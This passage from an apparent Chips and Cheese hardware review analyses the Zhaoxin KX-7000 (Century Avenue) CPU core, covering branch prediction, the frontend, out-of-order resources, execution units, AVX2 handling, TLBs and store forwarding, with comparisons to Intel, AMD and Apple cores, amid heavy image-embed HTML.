data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:514,&quot;width&quot;:938,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:7750,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/webp&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9bf3e6e1-d9e7-4ffb-997d-35a70a030191_938x514.webp 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In Century Avenueâ€™s favor, the direction predictor has vastly improved pattern recognition capabilities compared to its predecessor. When given repeating patterns of taken and not-taken branches, the KX-7000 handles a bit like Intelâ€™s Sunny Cove.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png" width="1010" height="537" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:537,&quot;width&quot;:1010,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:66802,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d170ad0-ff20-4c50-b9fc-4eeca2185ed9_1010x537.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Returns behave much like on LuJiaZui. Call+return pairs enjoy reasonable latency until they go more than four-deep. An inflection point further on suggests a second level return stack with approximately 32 entries. If there is a second level return stack, itâ€™s rather slow with a cost of 14 cycles per call+return pair. Bulldozer shows more typical behavior. Call+return pairs are fast until they overflow a 24 entry return stack.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png" width="992" height="472" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:472,&quot;width&quot;:992,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8142,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F90da6a11-a7ef-49c8-82be-3ae42c8a7782_992x472.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Century Avenueâ€™s frontend aims to deliver up to four instructions per cycle with minimal sophistication. A conventional fetch and decode setup can be good if tuned properly, but Century Avenueâ€™s frontend has a few clear weaknesses. Average instruction length can exceed 4 bytes in AVX2 code, thanks to VEX prefixes. AMD tackled this by increasing L1i bandwidth to 32B/cycle in 10h CPUs. Intel used loop buffers in Core 2 before introducing an op cache in Sandy Bridge (while keeping 16B/cycle L1i bandwidth). Either approach is fine, but Century Avenue does neither. Century Avenue also does not implement branch fusion, a technique that AMD and Intel have used for over a decade. An [add, add, cmp, jz] sequence executes at under 3 IPC.</p><p>Lack of sophistication extends to branch target caching. A single level BTB with effectively 3 cycle latency feels primitive today, especially when itâ€™s tied to the instruction cache. As before, a decoupled BTB isnâ€™t the only way to go. Appleâ€™s M1 also appears to have a BTB coupled to the L1i, but it compensates with a massive 192 KB L1i. Century Avenueâ€™s 64 KB L1i is larger than the 32 KB instruction caches found on many x86-64 cores, but it stops short of brute-forcing its way around large code footprints the way Apple does. To be fair to Zhaoxin, Bulldozer also combines a 64 KB L1i with poor L2 code bandwidth. However, I donâ€™t think thereâ€™s a good excuse for 3 cycle taken branch latency on any post-2024 core, especially one running below 4 GHz.</p><p>Micro-ops from the frontend are allocated into backend tracking structures, which carry out bookkeeping necessary for out-of-order execution. Register allocation goes hand-in-hand with register renaming, which breaks false dependencies by allocating a new physical register whenever an instruction writes to one. The rename/allocate stage is also a convenient place to carry out other optimizations and expose more parallelism to the backend.</p><p>Century Avenue recognizes zeroing idioms like XOR-ing a register with itself, and can tell the backend that such instructions are independent. However such XORs are still limited to three per cycle, suggesting they use an ALU port. The renamer also allocates a physical register to hold the result, even though it will always be zero. Move elimination works as well, though itâ€™s also limited to three per cycle.</p><p>Zhaoxin switches to a physical register file (PRF) based execution scheme, moving away from LuJiaZuiâ€™s ROB-based setup. Separate register files reduce data transfer within the core, and let designers scale ROB size independently of register file capacity. Both are significant advantages over LuJiaZui, and contribute to Century Avenue having several times as much reordering capacity. With a 192 entry ROB, Century Avenue has a theoretical out-of-order window on par with Intelâ€™s Haswell, AMDâ€™s Zen, and Centaurâ€™s CNS. LuJiaZuiâ€™s 48 entry ROB is nowhere close.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png" width="967" height="413" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:413,&quot;width&quot;:967,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:73130,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff2f8f9e7-94a3-4685-a381-7b6795d49d75_967x413.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Reorder buffer size only puts a cap on how far the backend can search ahead of a stalled instruction. Reordering capacity in practice is limited by whatever resource the core runs out of first, whether that be register files, memory ordering queues, or other structures. Century Avenueâ€™s register files are smaller than Haswell or Zenâ€™s, but the core can keep a reasonable number of branches and memory operations in flight.</p><p>Century Avenue has a semi-unified scheduler setup, shifting away from LuJiaZuiâ€™s distributed scheme. ALU, memory, and FP/vector operations each have a large scheduler with more than 40 entries. Branches appear to have their own scheduler, though maybe not a dedicated port. I wasnâ€™t able to execute a not-taken jump alongside three integer adds in the same cycle. In any case, Century Avenue has fewer scheduling queues than its predecessor, despite having more execution ports. That makes tuning scheduler size easier, because there are fewer degrees of freedom.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png" width="889" height="582" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:582,&quot;width&quot;:889,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:14114,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbdd1294a-d24d-44ba-86e9-16a5bedaa079_889x582.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Typically a unified scheduler can achieve similar performance to a distributed one with fewer total entries. An entry in a unified scheduling queue can hold a pending micro-op for any of the schedulerâ€™s ports. That reduces the chance of an individual queue filling up and blocking further incoming instructions even though scheduler entries are available in other queues. With several large multi-ported schedulers, Century Avenue has more scheduler capacity than Haswell, Centaur CNS, or even Skylake.</p><p>Three ALU pipes generate results for scalar integer operations. Thus Century Avenue joins Armâ€™s Neoverse N1 and Intelâ€™s Sandy Bridge in having thee ALU ports in an overall four-wide core. Two of Century Avenueâ€™s ALU pipes have integer multipliers. 64-bit integer multiplies have just two-cycle latency, giving the core excellent integer multiply performance.</p><p>Century Avenueâ€™s FP/vector side is surprisingly powerful. The FP/vector unit appears to have four pipes, all of which can execute 128-bit vector integer adds. Floating point operations execute at two per cycle. Amazingly, that rate applies even for 256-bit vector FMA instructions. Century Avenue therefore matches Haswellâ€™s per-cycle FLOP count. Floating point latency is normal at 3 cycles for FP adds and multiplies or 5 cycles for a fused multiply-add. Vector integer adds have single-cycle latency.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png" width="603" height="344" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/43317dde-95f9-403e-af4a-51ed40185a63_603x344.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:344,&quot;width&quot;:603,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:5130,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F43317dde-95f9-403e-af4a-51ed40185a63_603x344.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>However, the rest of Century Avenueâ€™s execution engine isnâ€™t so enthusiastic about AVX2. Instructions that operate on 256-bit vectors are broken into two 128-bit micro-ops for all the common cases I tested. A 256-bit FP add takes two ROB entries, two scheduler slots, and the result consumes two register file entries. On the memory side, 256-bit loads and stores take two load queue or two store queue entries, respectively. Zhaoxinâ€™s AVX2 approach is the opposite of Zen 4â€™s AVX-512 strategy: AMD left execution throughput largely unchanged from the prior generation, however, its 512-bit register file entries let it keep more work in flight and better feed those execution units. Century Avenueâ€™s approach is to bring execution throughput first, and think about how to feed them later.</p><p>Memory accesses start with a pair of address generation units (AGUs), which calculate virtual addresses. The AGUs are fed by 48 scheduler entries, which could be a 48 entry unified scheduler or two 24 entry queues.</p><p>48-bit virtual addresses from the AGUs are then translated into 46-bit physical addresses. Data-side address translations are cached in a 96 entry, 6-way set associative data TLB. 2 MB pages use a separate 32 entry, 4-way DTLB. Century Avenue doesnâ€™t report L2 TLB capacity through CPUID, and DTLB misses add ~20 cycles of latency. Thatâ€™s higher than usual for cores with a second level TLB, except for Bulldozer.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png" width="1456" height="709" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:709,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1381370,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3273fff0-39f7-4059-b822-f707e1305611_2560x1246.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Besides address translation, the load/store unit has to handle memory dependencies. Century Avenue appears to do an initial dependency check using the virtual address, because a load has a false dependency on a store offset by 4 KB. For real dependencies, Century Avenue can do store forwarding with 5 cycle latency. Like many other cores, partial overlaps cause fast forwarding to fail. Century Avenue takes a 22 cycle penalty in that case, which isnâ€™t out of the ordinary. For independent accesses, Century Avenue can do Core 2 style memory disambiguation. That lets a load execute ahead of a store with an unknown address, improving memory pipeline utilization.</p><p>â€œMisalignedâ€ loads and stores that straddle a 